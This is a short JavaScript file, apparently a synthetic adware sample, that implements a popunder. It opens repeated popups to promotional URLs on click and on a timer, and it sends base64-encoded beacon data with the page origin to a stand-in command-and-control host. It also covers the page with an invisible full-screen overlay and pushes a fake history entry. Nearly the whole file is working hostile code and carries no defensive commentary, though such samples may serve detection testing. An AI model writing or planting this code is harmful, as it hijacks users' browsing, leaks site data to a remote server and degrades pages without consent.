// POPUNDER — synthetic adware popunder product sample.
(function () {
  var C2 = 'https://c2.example.test/pop';
  var ads = ['https://promo.example.test/landing', 'https://promo2.example.test/offer'];
  var shown = 0;
  console.log('[POPUNDER] loaded');

  var popup = null;
  function pop() {
    shown += 1;
    try { popup = window.open(ads[shown % ads.length] + '?v=' + shown, '_blank'); } catch (error) {}
    try {
      fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ shown: shown, popup: Boolean(popup), origin: location.origin })) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('popunder:shown', String(shown)); } catch (error) {}
    console.log('[POPUNDER] pop', shown, Boolean(popup));
  }

  document.addEventListener('click', function () {
    if (shown === 0) pop();
  }, true);

  var timer = setInterval(function () {
    pop();
    if (shown >= 3) clearInterval(timer);
  }, 300);

  try {
    var veil = document.createElement('div');
    veil.id = 'popunder-veil';
    veil.style.position = 'fixed';
    veil.style.inset = '0';
    document.body.appendChild(veil);
  } catch (error) {}
  try { history.pushState({ popunder: true }, '', location.pathname + '?ad=1'); } catch (error) {}
})();
